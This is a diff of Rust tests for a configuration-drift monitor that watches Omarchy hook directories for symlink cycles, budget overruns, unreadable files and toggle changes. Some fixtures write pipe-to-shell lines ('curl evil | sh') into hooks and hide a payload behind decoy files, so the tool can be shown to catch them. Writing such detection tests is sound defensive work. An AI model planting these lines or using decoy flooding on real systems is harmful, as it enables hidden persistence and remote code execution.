@@ -93,6 +93,40 @@ fn class(env: &Env, subject: &str) -> String {
         .unwrap_or_else(|| panic!("no drift item {subject}"))
 }
 
+/// `seldon drift --all --json`: "class rule" of the item of `subject` and
+/// `kind`.
+fn class_of(env: &Env, subject: &str, kind: &str) -> String {
+    ok(env, &["drift", "--all", "--json"])["drift"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|d| d["subject"] == subject && d["kind"] == kind)
+        .map(|d| {
+            format!(
+                "{} {}",
+                d["class"].as_str().unwrap(),
+                d["rule"].as_str().unwrap()
+            )
+        })
+        .unwrap_or_else(|| panic!("no drift item {kind} {subject}"))
+}
+
+/// `seldon drift --json`: the subjects of the open items.
+fn open_items(env: &Env) -> Vec<String> {
+    ok(env, &["drift", "--json"])["drift"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|d| d["subject"].as_str().unwrap().to_string())
+        .collect()
+}
+
+/// Whether the tests run as root (CI): root reads a file whatever its mode.
+fn root() -> bool {
+    use std::os::unix::fs::MetadataExt as _;
+    std::fs::metadata("/proc/self").is_ok_and(|m| m.uid() == 0)
+}
+
 /// WP-109 stage 1: three ways a hook ran without an event. Each now yields
 /// one on the persistence path, hash only, and is a crisis; outside the
 /// persistence paths nothing changes. A second capture writes nothing.
@@ -206,50 +240,289 @@ fn hook_blind_spots_yield_crises() {
     assert_eq!(config_events(&env).len(), n);
 }
 
-/// The hook directory itself may be a link; a link back into the tree is
-/// not followed, and one link records at most `LINKED_FILES` files. Both
-/// are counted in the collector's message.
+/// WP-113 round 2 (B1): a link back to a directory the walk went through
+/// is not followed — here the hook directory itself, with no link above it
+/// (without the guard on link targets the walk would cycle into the
+/// budget).
 #[test]
-fn a_linked_hook_directory_loops_and_its_budget() {
+fn a_back_link_to_an_ancestor_is_not_followed() {
     let env = Env::new(Snapper::Missing);
     env.init_logbook();
-    let home = &env.home;
-    let real = home.join("dotfiles/omarchy-hooks");
-    write(real.join("post-update.d/one.sh"), "#!/bin/bash\n");
-    symlink(&real, &home.join(".config/omarchy/hooks"));
+    let hooks = env.home.join(".config/omarchy/hooks");
+    write(hooks.join("post-update.d/one.sh"), "#!/bin/bash\n");
     capture_config(&env); // baseline
+    symlink(&hooks, &hooks.join("post-update.d/back"));
+    let c = capture_config(&env);
+    let message = message(&c);
+    assert!(
+        message.contains("1 linked director(ies) not followed: walked already"),
+        "{message}"
+    );
+    assert!(!message.contains("cut off"), "{message}");
+    assert!(config_events(&env).is_empty(), "{:?}", config_events(&env));
+}
 
-    write(real.join("post-update.d/two.sh"), "#!/bin/bash\necho two\n");
-    symlink(&real, &real.join("post-update.d/back"));
-    let many = seldon::collectors::config::LINKED_FILES + 3;
-    for i in 0..many {
-        write(real.join(format!("zz.d/f{i:04}")), format!("{i}\n"));
-    }
+/// B1: a two-link cycle outside the home directory (A → B → A) is walked
+/// once; the hook directory is a link into it.
+#[test]
+fn a_two_link_cycle_is_walked_once() {
+    let env = Env::new(Snapper::Missing);
+    env.init_logbook();
+    let (a, b) = (
+        env.tmp.path().join("cycle/a"),
+        env.tmp.path().join("cycle/b"),
+    );
+    write(a.join("a.sh"), "#!/bin/bash\n");
+    write(b.join("b.sh"), "#!/bin/bash\n");
+    symlink(&b, &a.join("to-b"));
+    symlink(&a, &b.join("to-a"));
+    capture_config(&env); // baseline
+    symlink(&a, &env.home.join(".config/omarchy/hooks/post-update.d"));
     let c = capture_config(&env);
     let message = message(&c);
     assert!(
         message.contains("1 linked director(ies) not followed"),
         "{message}"
     );
-    // a directory's files first: two.sh, then zz.d fills the budget
-    // (one.sh is no new file)
-    assert!(
-        message.contains("5 file(s) not watched: more than 1024"),
-        "{message}"
+    assert!(!message.contains("cut off"), "{message}");
+    let added: Vec<String> = config_events(&env).into_iter().map(|e| e.1).collect();
+    assert_eq!(
+        added,
+        [
+            "~/.config/omarchy/hooks/post-update.d/a.sh",
+            "~/.config/omarchy/hooks/post-update.d/to-b/b.sh",
+        ]
     );
-    let added: Vec<String> = config_events(&env)
-        .into_iter()
-        .filter(|e| e.0 == "config-add")
-        .map(|e| e.1)
+}
+
+/// B1: below links no real directory is walked twice — a second link to
+/// a directory above one walked already does not walk that one again
+/// (without the guard on directories below links it would).
+#[test]
+fn below_links_no_directory_is_walked_twice() {
+    let env = Env::new(Snapper::Missing);
+    env.init_logbook();
+    let x = env.tmp.path().join("x");
+    write(x.join("a/f.sh"), "#!/bin/bash\n");
+    write(x.join("top.sh"), "#!/bin/bash\n");
+    capture_config(&env); // baseline
+    let hooks = env.home.join(".config/omarchy/hooks");
+    symlink(&x.join("a"), &hooks.join("l1.d"));
+    symlink(&x, &hooks.join("l2.d"));
+    capture_config(&env);
+    let added: Vec<String> = config_events(&env).into_iter().map(|e| e.1).collect();
+    assert_eq!(
+        added,
+        [
+            "~/.config/omarchy/hooks/l1.d/f.sh",
+            "~/.config/omarchy/hooks/l2.d/top.sh",
+        ]
+    );
+}
+
+/// B1, the reviewer's probe: two links per level, 17 levels deep, used to
+/// double the walk per level (hours at 25 levels). Each directory is
+/// walked once: fast, and the manifest stays small.
+#[test]
+fn a_diamond_of_links_is_linear() {
+    let env = Env::new(Snapper::Missing);
+    env.init_logbook();
+    let levels = 17;
+    let d = |i: usize| env.tmp.path().join(format!("diamond/d{i:02}"));
+    for i in 0..=levels {
+        write(d(i).join("f.sh"), format!("#!/bin/bash\n# {i}\n"));
+    }
+    for i in 0..levels {
+        symlink(&d(i + 1), &d(i).join("a"));
+        symlink(&d(i + 1), &d(i).join("b"));
+    }
+    capture_config(&env); // baseline
+    symlink(&d(0), &env.home.join(".config/omarchy/hooks/post-update.d"));
+    let start = std::time::Instant::now();
+    let c = capture_config(&env);
+    let took = start.elapsed();
+    assert!(took < std::time::Duration::from_secs(1), "{took:?}");
+    let manifest = env.home.join(".local/state/seldon/manifest.json");
+    let size = std::fs::metadata(&manifest).unwrap().len();
+    assert!(size < 64 * 1024, "manifest {size} bytes");
+    assert_eq!(config_events(&env).len(), levels + 1, "one file per level");
+    assert!(message(&c).contains(&format!("{levels} linked director(ies) not followed")));
+}
+
+/// B1: one budget per walk. A link past it is cut off: one crisis on the
+/// link itself (a persistence path nobody can see into), nothing listed
+/// below it, the files recorded there before keep their hashes; once it
+/// fits again the changes made meanwhile show — decoys cannot hide a
+/// payload.
+#[test]
+fn a_link_past_the_budget_is_cut_off_and_a_crisis() {
+    let env = Env::new(Snapper::Missing);
+    env.init_logbook();
+    let target = env.tmp.path().join("big");
+    write(target.join("aa.sh"), "#!/bin/bash\n");
+    let link = env.home.join(".config/omarchy/hooks/post-update.d");
+    symlink(&target, &link);
+    capture_config(&env); // baseline: aa.sh known
+    let key = "~/.config/omarchy/hooks/post-update.d";
+
+    let budget = seldon::collectors::config::LINKED_ENTRIES;
+    for i in 0..budget {
+        write(target.join(format!("decoy/{i:05}")), format!("{i}\n"));
+    }
+    write(target.join("aa.sh"), "#!/bin/bash\ncurl x | sh\n");
+    write(target.join("zz-payload.sh"), "#!/bin/bash\nevil\n");
+    let c = capture_config(&env);
+    assert!(
+        message(&c).contains("1 linked director(ies) cut off"),
+        "{c}"
+    );
+    let events = config_events(&env);
+    assert_eq!(
+        events.len(),
+        1,
+        "only the link: {:?}",
+        events.iter().map(|e| &e.1).collect::<Vec<_>>()
+    );
+    assert_eq!(
+        (events[0].0.as_str(), events[0].1.as_str()),
+        ("config-add", key)
+    );
+    assert_eq!(events[0].2["cutOff"], true);
+    assert_eq!(class_of(&env, key, "config-add"), "crisis always-red-paths");
+    let manifest = env.home.join(".local/state/seldon/manifest.json");
+    assert!(
+        std::fs::metadata(&manifest).unwrap().len() < 64 * 1024,
+        "nothing listed below"
+    );
+    let n = config_events(&env).len();
+    capture_config(&env);
+    assert_eq!(config_events(&env).len(), n, "idempotent while cut off");
+
+    // the decoys go: the payload and the change made meanwhile show
+    std::fs::remove_dir_all(target.join("decoy")).unwrap();
+    capture_config(&env);
+    let mut after: Vec<String> = config_events(&env)[n..]
+        .iter()
+        .map(|e| format!("{} {}", e.0, e.1))
         .collect();
-    assert!(added.contains(&"~/.config/omarchy/hooks/post-update.d/two.sh".to_string()));
-    assert!(added.iter().all(|s| !s.contains("/back/")), "{added:?}");
-    // a file past the budget is skipped, not removed
-    assert!(
-        config_events(&env).iter().all(|e| e.0 != "config-remove"),
-        "{:?}",
-        config_events(&env)
+    after.sort(); // the ledger orders them by time
+    assert_eq!(
+        after,
+        [
+            format!("config-add {key}/zz-payload.sh"),
+            format!("config-change {key}/aa.sh"),
+            format!("config-remove {key}"),
+        ]
     );
+}
+
+/// N3: a persistence-path link into the logbook (or the state directory,
+/// or `~/.config/seldon`) is not followed: it would change with every
+/// capture.
+#[test]
+fn a_link_into_the_logbook_is_not_followed() {
+    let env = Env::new(Snapper::Missing);
+    let logbook = env.init_logbook();
+    capture_config(&env); // baseline
+    symlink(
+        &logbook.join("ledger"),
+        &env.home.join(".config/omarchy/hooks/post-update.d"),
+    );
+    symlink(
+        &env.home.join(".local/state/seldon"),
+        &env.home.join(".config/omarchy/hooks/state.d"),
+    );
+    symlink(
+        &logbook.join("STATUS.md"),
+        &env.home.join(".config/omarchy/hooks/status"),
+    );
+    for _ in 0..4 {
+        let c = capture_config(&env);
+        assert!(
+            message(&c).contains("3 link(s) into Seldon's own files not followed"),
+            "{c}"
+        );
+    }
+    assert!(config_events(&env).is_empty(), "{:?}", config_events(&env));
+}
+
+/// N1: a hook that was unreadable for a while keeps its last hash, so the
+/// content it has when readable again is compared and evented.
+#[test]
+fn an_unreadable_round_trip_is_seen() {
+    if root() {
+        eprintln!("skipped: root reads every file");
+        return;
+    }
+    use std::os::unix::fs::PermissionsExt as _;
+    let env = Env::new(Snapper::Missing);
+    env.init_logbook();
+    let hook = env.home.join(".config/omarchy/hooks/post-update.d/x.sh");
+    write(&hook, "#!/bin/bash\necho ok\n");
+    capture_config(&env); // baseline
+    std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o200)).unwrap();
+    let c = capture_config(&env);
+    assert!(
+        message(&c).contains("1 file(s) under persistence paths could not be read"),
+        "{c}"
+    );
+    std::fs::write(&hook, "#!/bin/bash\ncurl evil | sh\n").unwrap();
+    capture_config(&env);
+    std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
+    capture_config(&env);
+    let events = config_events(&env);
+    assert_eq!(events.len(), 1, "{events:?}");
+    assert_eq!(events[0].0, "config-change");
+    assert_eq!(
+        class_of(
+            &env,
+            "~/.config/omarchy/hooks/post-update.d/x.sh",
+            "config-change"
+        ),
+        "crisis always-red-paths"
+    );
+}
+
+/// N2: a file over 64 MiB under a persistence path is not read: its hash is
+/// a fingerprint of size, time and inode, and the event says so. The
+/// reviewer's 2 GiB sparse hook returns at once.
+#[test]
+fn a_huge_hook_is_hashed_by_its_metadata() {
+    let env = Env::new(Snapper::Missing);
+    env.init_logbook();
+    capture_config(&env); // baseline
+    let hook = env.home.join(".config/omarchy/hooks/post-update.d/huge.sh");
+    std::fs::create_dir_all(hook.parent().unwrap()).unwrap();
+    std::fs::File::create(&hook)
+        .unwrap()
+        .set_len(2 << 30)
+        .unwrap();
+    let start = std::time::Instant::now();
+    capture_config(&env);
+    assert!(
+        start.elapsed() < std::time::Duration::from_secs(2),
+        "{:?}",
+        start.elapsed()
+    );
+    let events = config_events(&env);
+    assert_eq!(events.len(), 1, "{events:?}");
+    assert_eq!(events[0].2["hashBasis"], "stat");
+    let meta = std::fs::metadata(&hook).unwrap();
+    assert_eq!(events[0].2["hashTo"], seldon_stat_hash(&meta));
+    std::fs::remove_file(&hook).unwrap();
+}
+
+/// The fingerprint `stat_hash` writes, recomputed: `stat <size> <mtime ns>
+/// <inode>`.
+fn seldon_stat_hash(meta: &std::fs::Metadata) -> String {
+    use std::os::unix::fs::MetadataExt as _;
+    let mtime = meta
+        .modified()
+        .unwrap()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_nanos();
+    seldon::sys::sha256_hex(format!("stat {} {} {}\n", meta.len(), mtime, meta.ino()).as_bytes())
 }
 
 /// Upgrading to WP-113 hashes a binary or large hook that an earlier
@@ -281,13 +554,14 @@ fn a_skipped_hook_becomes_hashed_without_an_event() {
     assert_eq!(events[0].0, "config-change");
 }
 
-/// `omarchy-hyprland-toggle <flag> on` copies Omarchy's flag into the
-/// toggles directory: routine by evidence. Lua of unknown origin there is
-/// attention. Turning a flag off removes it: the removal carries the
-/// evidence (recorded for ADR-0028 amendment B) and is attention until
-/// that amendment.
+/// ADR-0037 §1 (B2): a toggle is routine both ways. Omarchy's menu
+/// toggles touch and remove empty flag files (`omarchy-toggle`: bar,
+/// screensaver, suspend, crash capture); `omarchy-hyprland-toggle` copies
+/// and removes Omarchy's flag (`omarchy-default` evidence, also recorded
+/// on the removal). Neither is ever a drift item. Lua of unknown origin
+/// there stays attention.
 #[test]
-fn toggles_are_hashed_with_omarchy_flags_as_evidence() {
+fn toggles_are_routine_both_ways() {
     let env = Env::new(Snapper::Missing);
     env.init_logbook();
     let home = &env.home;
@@ -299,39 +573,70 @@ fn toggles_are_hashed_with_omarchy_flags_as_evidence() {
     );
     write(omarchy.join("default/hypr/toggles/flags.lua"), "-- flags\n");
     trust(&omarchy, 0o755);
-    let toggles = home.join(".local/state/omarchy/toggles/hypr");
-    write(toggles.join("flags.lua"), "-- flags\n");
+    let toggles = home.join(".local/state/omarchy/toggles");
+    write(toggles.join("hypr/flags.lua"), "-- flags\n");
+    write(toggles.join("bar-off"), "");
     capture_config(&env); // baseline
 
-    write(toggles.join("window-no-gaps.lua"), flag);
-    write(toggles.join("mine.lua"), "hl.exec('x')\n");
+    // on: two menu flags, one Hyprland flag; and foreign Lua
+    write(toggles.join("screensaver-off"), "");
+    write(toggles.join("suspend-off"), "");
+    write(toggles.join("hypr/window-no-gaps.lua"), flag);
+    write(toggles.join("hypr/mine.lua"), "hl.exec('x')\n");
+    // off: a menu flag
+    std::fs::remove_file(toggles.join("bar-off")).unwrap();
     capture_config(&env);
-    let events = config_events(&env);
-    let mark = |s: &str| events.iter().find(|e| e.1 == s).unwrap().2["matches"].clone();
-    let key = |n: &str| format!("~/.local/state/omarchy/toggles/hypr/{n}");
-    assert_eq!(mark(&key("window-no-gaps.lua")), "omarchy-default");
-    assert_eq!(mark(&key("mine.lua")), Value::Null);
+    let key = |n: &str| format!("~/.local/state/omarchy/toggles/{n}");
     assert_eq!(
-        class(&env, &key("window-no-gaps.lua")),
+        class_of(&env, &key("screensaver-off"), "config-add"),
+        "routine toggle-flag"
+    );
+    assert_eq!(
+        class_of(&env, &key("bar-off"), "config-remove"),
+        "routine toggle-flag"
+    );
+    assert_eq!(
+        class_of(&env, &key("hypr/window-no-gaps.lua"), "config-add"),
         "routine omarchy-default"
     );
-    assert_eq!(class(&env, &key("mine.lua")), "attention config");
+    assert_eq!(
+        class_of(&env, &key("hypr/mine.lua"), "config-add"),
+        "attention config"
+    );
+    assert_eq!(
+        open_items(&env),
+        [key("hypr/mine.lua")],
+        "nothing else is drift"
+    );
 
-    // off
-    std::fs::remove_file(toggles.join("window-no-gaps.lua")).unwrap();
+    // off again, and back on
+    std::fs::remove_file(toggles.join("hypr/window-no-gaps.lua")).unwrap();
+    std::fs::remove_file(toggles.join("screensaver-off")).unwrap();
+    write(toggles.join("bar-off"), "");
     capture_config(&env);
     let events = config_events(&env);
-    let off = events.last().unwrap();
-    assert_eq!(
-        (off.0.as_str(), off.1.as_str()),
-        ("config-remove", key("window-no-gaps.lua").as_str())
-    );
+    let off = events
+        .iter()
+        .find(|e| e.0 == "config-remove" && e.1 == key("hypr/window-no-gaps.lua"))
+        .unwrap();
     assert_eq!(off.2["matches"], "omarchy-default");
     assert_eq!(
-        class(&env, &key("window-no-gaps.lua")),
-        "attention config-remove"
+        class_of(&env, &key("hypr/window-no-gaps.lua"), "config-remove"),
+        "routine omarchy-default"
     );
-    let n = events.len();
+    assert_eq!(
+        class_of(&env, &key("screensaver-off"), "config-remove"),
+        "routine toggle-flag"
+    );
+    // a flag file that gained content is no flag file
+    write(toggles.join("suspend-off"), "x\n");
+    capture_config(&env);
+    assert_eq!(
+        class_of(&env, &key("suspend-off"), "config-change"),
+        "attention config"
+    );
+    assert_eq!(open_items(&env).len(), 2, "{:?}", open_items(&env));
+    let n = config_events(&env).len();
     capture_config(&env);
     assert_eq!(config_events(&env).len(), n, "idempotent");
 }
